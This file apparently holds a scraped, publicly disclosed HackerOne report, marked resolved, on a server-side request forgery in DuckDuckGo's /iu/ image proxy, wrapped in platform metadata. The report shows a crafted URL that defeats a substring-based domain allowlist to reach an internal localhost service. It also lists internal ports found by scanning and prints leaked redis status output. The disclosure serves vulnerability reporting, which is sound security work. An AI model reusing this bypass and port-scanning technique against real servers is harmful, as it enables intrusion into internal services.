@@ -1,0 +1,229 @@
+{
+  "id": 398641,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTg2NDE=",
+  "url": "https://hackerone.com/reports/398641",
+  "title": "SSRF on duckduckgo.com/iu/",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-08-23T18:18:39.196Z",
+  "submitted_at": "2018-08-23T18:18:39.196Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d0nut",
+    "url": "/d0nut",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/231/382/894de727558950a3bea19bed943279756d7f1f4a_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 10995,
+    "url": "https://hackerone.com/duckduckgo",
+    "handle": "duckduckgo",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4mpaehke5u0ubioeqvys0hcesjle/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4mpaehke5u0ubioeqvys0hcesjle/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "DuckDuckGo",
+      "twitter_handle": "duckduckgo",
+      "website": "https://duckduckgo.com",
+      "about": "Independent online protection company. Get our mobile & desktop browser with protections built-in, including our search engine that doesn’t track you."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-09-09T20:12:35.028Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-08-29T19:51:58.039Z",
+  "team_member_agreed_on_going_public_at": "2018-09-09T20:12:34.916Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Normally, a call to `https://duckduckgo.com/iu` contains a query parameter (`u`) with some path using the domain `yimg.com`. This call will succeed in most cases.\n{F337121}\n\nAnd if we change that path to something like `https://google.com` it's rejected.\n{F337118}\n\nHowever, it appears that the check that ensures that `yimg.com` is the target domain is solely based on whether or not that string appears in the url, independent of where. This means we can stuff it in a query parameter and bypass this check.\n\n{F337120}\n\nFurthermore, with this bypass we can hit localhost and perform a port scan (see [XSPA](https://indiatriks.blogspot.com/2012/07/xspa-cross-site-port-attack.html)). \n\nFor example, I have been able to conclude that services are running on the following ports:\n```\n22\n25\n80\n443\n587\n6380\n6432\n6767\n6868\n8000\n```\n\nSome of these services don't like talking HTTP (like `22` and `25`) so they never respond, but other services seem to talk HTTP and will return seemingly sensitive data about redis. \nFor example:\n`https://duckduckgo.com/iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://yimg.com/` returns the following:\n```\n{\n  \"current_time\": \"2018-08-23T17:56:06\",\n  \"deployment_environment\": \"prod\",\n  \"redis_local_last_successful_ping\": \"2018-08-23T13:56:05\",\n  \"redis_local_url\": \"redis://127.0.0.1:6380\",\n  \"redis_regional_last_successful_ping\": \"2018-08-23T13:56:05\",\n  \"redis_regional_url\": \"redis://cache-services.duckduckgo.com:6380\",\n  \"stat_blocked_ips_removed_since_launch\": 8787,\n  \"stat_blocked_ips_since_launch\": 12185,\n  \"stat_ipset_blocks\": 266,\n  \"stat_redis_local_messages_received\": 3613,\n  \"stat_redis_regional_messages_received\": 10211,\n  \"status\": \"up\"\n}\n```\n\n## Impact\n\nThis could be used to interact with services that are not intended to be exposed. This also enables an XSPA attack. Additionally, information disclosure about a redis service. \n\nLastly, an attack on redis may be possible even though the requests seem restricted to http.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 337117,
+      "file_name": "ports_1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/337/117/208d916e32e2da82a8b239190ac655d795dac634/ports_1.png?response-content-disposition=attachment%3B%20filename%3D%22ports_1.png%22%3B%20filename%2A%3DUTF-8%27%27ports_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4IEP36XG%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T055842Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID27hHUhdoebQ9OsxYbjv6Du%2BRVTRqP2nArHZAwlpRI7AiBokrXH%2BOodlvA6M3cmoeaZf4fbrwjcOT4aU%2ByoVdtr7iqyBQh%2FEAMaDDAxMzYxOTI3NDg0OSIMqtMxH5t4ZWlFIrz4Ko8FLKOpcEmwEvsQp0npqYt2J2o6L1iyDYVdiatTzwaGU7mAUtEiIoNq2jzXMZ0eI6nFatQ6pAMW69kr9Rr1ySbnJlx%2FTUehsU77ACk4FOp51IWeYm5JwqA0tHH08yJhatCypuxw1zCp3vviF%2FjBvVnMw%2BGq2kyVN5r1MjxVjul0P5JZbbhxI1iRSAGFlxsAHHO0Gve1mBl%2FDu8p5S094uf3Dd5A88DUuE2WuIX9i5MEHKhBa1PTkW1qIKL1GdYb6Sd16rta3IX0B2hKMCWVWtaQMnUMsraOaOffLBhbf2%2BQwkRwIxODI18TmkJ7L%2FK81BCHqkgb43y%2B06NjH7pVwRZweXfaHXODXTCEM7Ho312MJTlwySL7xDkhjpgP1qUOn033KRpPeM8RAdz49%2FbmTFRJowwdEkNb5lUcTkD6Y1dKgOu8MW%2BQEK6xcHQ2CEYilnZby4JLTUUs5n%2BuHq8gAMODep8SOfQrT6kbxYOoL55K%2BMu7FQPRHYlbNKyQ0Ie5JJKKdtvha1vaB%2BcZNG4qflQ5eN48zJQMUPOub8t1RlbwmxS5llXLOVbxcaoxJzBAFIjZPiydgeF7lUdIZkt6BBok3frpSv3%2FpAKJbCplCSQbv%2Fr5F21s8PcfjH%2FGqsPHRxNFLDGVdhrl3sbOUXbNBo%2F7fUsl99Moi1B%2B5qKhrKuAKqQXxjldiN4PRYbhxGa%2B9VHOruP%2FaPv7Vvhzz3cL3%2BWwN3WsJJMxFqa3M8PNC%2BCE6J6RHcC9W2tuwWJW5ThivUcSgVyRZ408ZsbgBTUpYmZjCQSSOoQ4IhFI32MC%2Bqo%2Fdmj%2B%2FCra6xsqo%2FTGRZ7vnHxjTIWHcWdxjMaqrz2CbcZD1OykGIgpklJCaecqlxToKTC3wLfSBjqyAaaYYvZzKPCNCWRHryKtN5cRqWeyxRyN34PE6BJuhJVn10pyqj6JOaEY4OHWuF4SPQFvJOqeeHV4Sq7IaEDKn5ZhXcuyg3U%2FuPvPzn1n4nzodAnA8v8VDr%2BldXkP9esM3jRXT6m35xr510DSIfwZBoRGV75QNUNHee0FIBHq7W08UKVjP2MrbcduBvCxujGJL49u2FjH8DrlsGBvIZ%2Bhc6mzzy25be72BlvbLiYjE2LxfI8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d32c8ee53ee5488c40902ae0de597f920e860b7562dd095e0f9a88092d7a5118",
+      "file_size": 5686,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 337118,
+      "file_name": "google_not_allowed.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/337/118/6a7b9487b720e1571c7a8e0afa70dc5ba4353c12/google_not_allowed.png?response-content-disposition=attachment%3B%20filename%3D%22google_not_allowed.png%22%3B%20filename%2A%3DUTF-8%27%27google_not_allowed.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4IEP36XG%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T055842Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID27hHUhdoebQ9OsxYbjv6Du%2BRVTRqP2nArHZAwlpRI7AiBokrXH%2BOodlvA6M3cmoeaZf4fbrwjcOT4aU%2ByoVdtr7iqyBQh%2FEAMaDDAxMzYxOTI3NDg0OSIMqtMxH5t4ZWlFIrz4Ko8FLKOpcEmwEvsQp0npqYt2J2o6L1iyDYVdiatTzwaGU7mAUtEiIoNq2jzXMZ0eI6nFatQ6pAMW69kr9Rr1ySbnJlx%2FTUehsU77ACk4FOp51IWeYm5JwqA0tHH08yJhatCypuxw1zCp3vviF%2FjBvVnMw%2BGq2kyVN5r1MjxVjul0P5JZbbhxI1iRSAGFlxsAHHO0Gve1mBl%2FDu8p5S094uf3Dd5A88DUuE2WuIX9i5MEHKhBa1PTkW1qIKL1GdYb6Sd16rta3IX0B2hKMCWVWtaQMnUMsraOaOffLBhbf2%2BQwkRwIxODI18TmkJ7L%2FK81BCHqkgb43y%2B06NjH7pVwRZweXfaHXODXTCEM7Ho312MJTlwySL7xDkhjpgP1qUOn033KRpPeM8RAdz49%2FbmTFRJowwdEkNb5lUcTkD6Y1dKgOu8MW%2BQEK6xcHQ2CEYilnZby4JLTUUs5n%2BuHq8gAMODep8SOfQrT6kbxYOoL55K%2BMu7FQPRHYlbNKyQ0Ie5JJKKdtvha1vaB%2BcZNG4qflQ5eN48zJQMUPOub8t1RlbwmxS5llXLOVbxcaoxJzBAFIjZPiydgeF7lUdIZkt6BBok3frpSv3%2FpAKJbCplCSQbv%2Fr5F21s8PcfjH%2FGqsPHRxNFLDGVdhrl3sbOUXbNBo%2F7fUsl99Moi1B%2B5qKhrKuAKqQXxjldiN4PRYbhxGa%2B9VHOruP%2FaPv7Vvhzz3cL3%2BWwN3WsJJMxFqa3M8PNC%2BCE6J6RHcC9W2tuwWJW5ThivUcSgVyRZ408ZsbgBTUpYmZjCQSSOoQ4IhFI32MC%2Bqo%2Fdmj%2B%2FCra6xsqo%2FTGRZ7vnHxjTIWHcWdxjMaqrz2CbcZD1OykGIgpklJCaecqlxToKTC3wLfSBjqyAaaYYvZzKPCNCWRHryKtN5cRqWeyxRyN34PE6BJuhJVn10pyqj6JOaEY4OHWuF4SPQFvJOqeeHV4Sq7IaEDKn5ZhXcuyg3U%2FuPvPzn1n4nzodAnA8v8VDr%2BldXkP9esM3jRXT6m35xr510DSIfwZBoRGV75QNUNHee0FIBHq7W08UKVjP2MrbcduBvCxujGJL49u2FjH8DrlsGBvIZ%2Bhc6mzzy25be72BlvbLiYjE2LxfI8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=65209bb765aec79db751eee222e94a07646767bba5173bc7720ef6ee973ebcf0",
+      "file_size": 104005,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 337119,
+      "file_name": "ports_2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/337/119/262c76d51d7e2b9370d1a8105ad58fee66afb634/ports_2.png?response-content-disposition=attachment%3B%20filename%3D%22ports_2.png%22%3B%20filename%2A%3DUTF-8%27%27ports_2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4IEP36XG%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T055842Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID27hHUhdoebQ9OsxYbjv6Du%2BRVTRqP2nArHZAwlpRI7AiBokrXH%2BOodlvA6M3cmoeaZf4fbrwjcOT4aU%2ByoVdtr7iqyBQh%2FEAMaDDAxMzYxOTI3NDg0OSIMqtMxH5t4ZWlFIrz4Ko8FLKOpcEmwEvsQp0npqYt2J2o6L1iyDYVdiatTzwaGU7mAUtEiIoNq2jzXMZ0eI6nFatQ6pAMW69kr9Rr1ySbnJlx%2FTUehsU77ACk4FOp51IWeYm5JwqA0tHH08yJhatCypuxw1zCp3vviF%2FjBvVnMw%2BGq2kyVN5r1MjxVjul0P5JZbbhxI1iRSAGFlxsAHHO0Gve1mBl%2FDu8p5S094uf3Dd5A88DUuE2WuIX9i5MEHKhBa1PTkW1qIKL1GdYb6Sd16rta3IX0B2hKMCWVWtaQMnUMsraOaOffLBhbf2%2BQwkRwIxODI18TmkJ7L%2FK81BCHqkgb43y%2B06NjH7pVwRZweXfaHXODXTCEM7Ho312MJTlwySL7xDkhjpgP1qUOn033KRpPeM8RAdz49%2FbmTFRJowwdEkNb5lUcTkD6Y1dKgOu8MW%2BQEK6xcHQ2CEYilnZby4JLTUUs5n%2BuHq8gAMODep8SOfQrT6kbxYOoL55K%2BMu7FQPRHYlbNKyQ0Ie5JJKKdtvha1vaB%2BcZNG4qflQ5eN48zJQMUPOub8t1RlbwmxS5llXLOVbxcaoxJzBAFIjZPiydgeF7lUdIZkt6BBok3frpSv3%2FpAKJbCplCSQbv%2Fr5F21s8PcfjH%2FGqsPHRxNFLDGVdhrl3sbOUXbNBo%2F7fUsl99Moi1B%2B5qKhrKuAKqQXxjldiN4PRYbhxGa%2B9VHOruP%2FaPv7Vvhzz3cL3%2BWwN3WsJJMxFqa3M8PNC%2BCE6J6RHcC9W2tuwWJW5ThivUcSgVyRZ408ZsbgBTUpYmZjCQSSOoQ4IhFI32MC%2Bqo%2Fdmj%2B%2FCra6xsqo%2FTGRZ7vnHxjTIWHcWdxjMaqrz2CbcZD1OykGIgpklJCaecqlxToKTC3wLfSBjqyAaaYYvZzKPCNCWRHryKtN5cRqWeyxRyN34PE6BJuhJVn10pyqj6JOaEY4OHWuF4SPQFvJOqeeHV4Sq7IaEDKn5ZhXcuyg3U%2FuPvPzn1n4nzodAnA8v8VDr%2BldXkP9esM3jRXT6m35xr510DSIfwZBoRGV75QNUNHee0FIBHq7W08UKVjP2MrbcduBvCxujGJL49u2FjH8DrlsGBvIZ%2Bhc6mzzy25be72BlvbLiYjE2LxfI8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=27e5f62f40565d35bffc313496b6cdf25ee19b449e58f9a8e3dd023b6cc0cfcc",
+      "file_size": 1602,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 337120,
+      "file_name": "query_param_bypass.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/337/120/d0c6a4bad5b9c6dde8e4f407ec06e64c0205309a/query_param_bypass.png?response-content-disposition=attachment%3B%20filename%3D%22query_param_bypass.png%22%3B%20filename%2A%3DUTF-8%27%27query_param_bypass.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4IEP36XG%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T055842Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID27hHUhdoebQ9OsxYbjv6Du%2BRVTRqP2nArHZAwlpRI7AiBokrXH%2BOodlvA6M3cmoeaZf4fbrwjcOT4aU%2ByoVdtr7iqyBQh%2FEAMaDDAxMzYxOTI3NDg0OSIMqtMxH5t4ZWlFIrz4Ko8FLKOpcEmwEvsQp0npqYt2J2o6L1iyDYVdiatTzwaGU7mAUtEiIoNq2jzXMZ0eI6nFatQ6pAMW69kr9Rr1ySbnJlx%2FTUehsU77ACk4FOp51IWeYm5JwqA0tHH08yJhatCypuxw1zCp3vviF%2FjBvVnMw%2BGq2kyVN5r1MjxVjul0P5JZbbhxI1iRSAGFlxsAHHO0Gve1mBl%2FDu8p5S094uf3Dd5A88DUuE2WuIX9i5MEHKhBa1PTkW1qIKL1GdYb6Sd16rta3IX0B2hKMCWVWtaQMnUMsraOaOffLBhbf2%2BQwkRwIxODI18TmkJ7L%2FK81BCHqkgb43y%2B06NjH7pVwRZweXfaHXODXTCEM7Ho312MJTlwySL7xDkhjpgP1qUOn033KRpPeM8RAdz49%2FbmTFRJowwdEkNb5lUcTkD6Y1dKgOu8MW%2BQEK6xcHQ2CEYilnZby4JLTUUs5n%2BuHq8gAMODep8SOfQrT6kbxYOoL55K%2BMu7FQPRHYlbNKyQ0Ie5JJKKdtvha1vaB%2BcZNG4qflQ5eN48zJQMUPOub8t1RlbwmxS5llXLOVbxcaoxJzBAFIjZPiydgeF7lUdIZkt6BBok3frpSv3%2FpAKJbCplCSQbv%2Fr5F21s8PcfjH%2FGqsPHRxNFLDGVdhrl3sbOUXbNBo%2F7fUsl99Moi1B%2B5qKhrKuAKqQXxjldiN4PRYbhxGa%2B9VHOruP%2FaPv7Vvhzz3cL3%2BWwN3WsJJMxFqa3M8PNC%2BCE6J6RHcC9W2tuwWJW5ThivUcSgVyRZ408ZsbgBTUpYmZjCQSSOoQ4IhFI32MC%2Bqo%2Fdmj%2B%2FCra6xsqo%2FTGRZ7vnHxjTIWHcWdxjMaqrz2CbcZD1OykGIgpklJCaecqlxToKTC3wLfSBjqyAaaYYvZzKPCNCWRHryKtN5cRqWeyxRyN34PE6BJuhJVn10pyqj6JOaEY4OHWuF4SPQFvJOqeeHV4Sq7IaEDKn5ZhXcuyg3U%2FuPvPzn1n4nzodAnA8v8VDr%2BldXkP9esM3jRXT6m35xr510DSIfwZBoRGV75QNUNHee0FIBHq7W08UKVjP2MrbcduBvCxujGJL49u2FjH8DrlsGBvIZ%2Bhc6mzzy25be72BlvbLiYjE2LxfI8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a48ad7cbb62363d6c01ebb52aa6842cb6606adb69c476335994dc65f0a5e9076",
+      "file_size": 88400,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 337121,
+      "file_name": "yimg_ok.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/337/121/697dd6f78cc14fdd82da0bc3fb231b5556e06d29/yimg_ok.png?response-content-disposition=attachment%3B%20filename%3D%22yimg_ok.png%22%3B%20filename%2A%3DUTF-8%27%27yimg_ok.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4IEP36XG%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T055842Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID27hHUhdoebQ9OsxYbjv6Du%2BRVTRqP2nArHZAwlpRI7AiBokrXH%2BOodlvA6M3cmoeaZf4fbrwjcOT4aU%2ByoVdtr7iqyBQh%2FEAMaDDAxMzYxOTI3NDg0OSIMqtMxH5t4ZWlFIrz4Ko8FLKOpcEmwEvsQp0npqYt2J2o6L1iyDYVdiatTzwaGU7mAUtEiIoNq2jzXMZ0eI6nFatQ6pAMW69kr9Rr1ySbnJlx%2FTUehsU77ACk4FOp51IWeYm5JwqA0tHH08yJhatCypuxw1zCp3vviF%2FjBvVnMw%2BGq2kyVN5r1MjxVjul0P5JZbbhxI1iRSAGFlxsAHHO0Gve1mBl%2FDu8p5S094uf3Dd5A88DUuE2WuIX9i5MEHKhBa1PTkW1qIKL1GdYb6Sd16rta3IX0B2hKMCWVWtaQMnUMsraOaOffLBhbf2%2BQwkRwIxODI18TmkJ7L%2FK81BCHqkgb43y%2B06NjH7pVwRZweXfaHXODXTCEM7Ho312MJTlwySL7xDkhjpgP1qUOn033KRpPeM8RAdz49%2FbmTFRJowwdEkNb5lUcTkD6Y1dKgOu8MW%2BQEK6xcHQ2CEYilnZby4JLTUUs5n%2BuHq8gAMODep8SOfQrT6kbxYOoL55K%2BMu7FQPRHYlbNKyQ0Ie5JJKKdtvha1vaB%2BcZNG4qflQ5eN48zJQMUPOub8t1RlbwmxS5llXLOVbxcaoxJzBAFIjZPiydgeF7lUdIZkt6BBok3frpSv3%2FpAKJbCplCSQbv%2Fr5F21s8PcfjH%2FGqsPHRxNFLDGVdhrl3sbOUXbNBo%2F7fUsl99Moi1B%2B5qKhrKuAKqQXxjldiN4PRYbhxGa%2B9VHOruP%2FaPv7Vvhzz3cL3%2BWwN3WsJJMxFqa3M8PNC%2BCE6J6RHcC9W2tuwWJW5ThivUcSgVyRZ408ZsbgBTUpYmZjCQSSOoQ4IhFI32MC%2Bqo%2Fdmj%2B%2FCra6xsqo%2FTGRZ7vnHxjTIWHcWdxjMaqrz2CbcZD1OykGIgpklJCaecqlxToKTC3wLfSBjqyAaaYYvZzKPCNCWRHryKtN5cRqWeyxRyN34PE6BJuhJVn10pyqj6JOaEY4OHWuF4SPQFvJOqeeHV4Sq7IaEDKn5ZhXcuyg3U%2FuPvPzn1n4nzodAnA8v8VDr%2BldXkP9esM3jRXT6m35xr510DSIfwZBoRGV75QNUNHee0FIBHq7W08UKVjP2MrbcduBvCxujGJL49u2FjH8DrlsGBvIZ%2Bhc6mzzy25be72BlvbLiYjE2LxfI8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=50c16ccc50dcb5c1e4696c18a20ebbd5c9ca2017abefbf0a6894d982283d4d5f",
+      "file_size": 99612,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-09-28T19:51:58.130Z",
+  "allow_singular_disclosure_after": -245326004.21589568,
+  "singular_disclosure_allowed": true,
+  "vote_count": 164,
+  "voters": [
+    "omarzz",
+    "orange303",
+    "jokebookservice1",
+    "8ayac",
+    "smither",
+    "cxzer0",
+    "rhynorater",
+    "dee-see",
+    "youstin",
+    "ziot",
+    "and 154 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 8671,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.duckduckgo.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "398641",
+  "votes": 164,
+  "latest_disclosable_activity_at": "2018-10-15T17:21:13.142Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:58:42.527730",
+    "source": "https://hackerone.com/reports/398641.json",
+    "report_id": 398641
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTg2NDE=",
+    "databaseId": "398641",
+    "title": "SSRF on duckduckgo.com/iu/",
+    "url": "https://hackerone.com/reports/398641",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2018-09-09T20:12:35.028Z",
+    "created_at": "2018-08-23T18:18:39.196Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzY4",
+      "name": "Server-Side Request Forgery (SSRF)",
+      "external_id": "cwe-918"
+    },
+    "severity": {
+      "rating": "high",
+      "score": null
+    },
+    "reporter": {
+      "username": "d0nut"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vMTA5OTU=",
+      "handle": "duckduckgo",
+      "name": "DuckDuckGo",
+      "url": "https://hackerone.com/duckduckgo",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzM5ODY0MQ==",
+    "_id": "398641",
+    "disclosed": true,
+    "votes": 164,
+    "latest_disclosable_activity_at": "2018-10-15T17:21:13.142Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTg2NDE=",
+      "databaseId": "398641",
+      "title": "SSRF on duckduckgo.com/iu/",
+      "url": "https://hackerone.com/reports/398641",
+      "disclosed_at": "2018-09-09T20:12:35.028Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vMTA5OTU=",
+      "handle": "duckduckgo",
+      "name": "DuckDuckGo",
+      "url": "https://hackerone.com/duckduckgo",
+      "currency": "usd"
+    }
+  }
+}
